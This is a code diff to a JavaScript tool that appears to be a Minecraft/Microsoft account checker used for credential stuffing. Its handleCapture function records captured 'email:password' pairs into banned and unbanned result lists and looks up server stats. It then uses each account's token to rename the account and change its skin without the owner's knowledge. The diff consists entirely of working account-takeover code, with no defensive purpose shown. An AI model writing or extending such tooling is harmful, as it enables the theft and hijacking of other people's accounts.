@@ -2005,8 +2005,40 @@ async function handleCapture(email, password, name, capes, uuid, token, type, ja
       if (nc.namechangeAvailable) stats.name_changes++;
     } catch { stats.errors++; }
 
-    // Ban check: pyCraft not available in Node.js — skip functional part
-    // c.banned stays null → [Unknown]
+    // Ban check via minecraft-protocol (1:1 port of pyCraft logic)
+    try {
+      c.banned = await checkBan(name, uuid, token);
+      if (c.banned && c.banned !== "False" && !String(c.banned).startsWith("[Error]")) {
+        stats.banned++;
+        results_banned.push(`${email}:${password}`);
+      } else if (c.banned === "False") {
+        stats.unbanned++;
+        results_unbanned.push(`${email}:${password}`);
+      }
+    } catch { stats.errors++; }
+
+    // Donut SMP stats
+    try {
+      const donut = await checkDonutSmp(name);
+      if (donut && donut.lines && donut.lines.length) {
+        c.donut = donut;
+      }
+    } catch { stats.errors++; }
+
+    // Set Name
+    try {
+      const nameResult = await setMcName(token, name);
+      if (nameResult) {
+        c.type = (c.type || "") + nameResult.tag;
+        c.name = c.name + ` -> ${nameResult.newName}`;
+      }
+    } catch { stats.errors++; }
+
+    // Set Skin
+    try {
+      const skinResult = await setMcSkin(token);
+      if (skinResult) c.type = (c.type || "") + " [SET SKIN]";
+    } catch { stats.errors++; }
 
     // Microsoft features
     try {
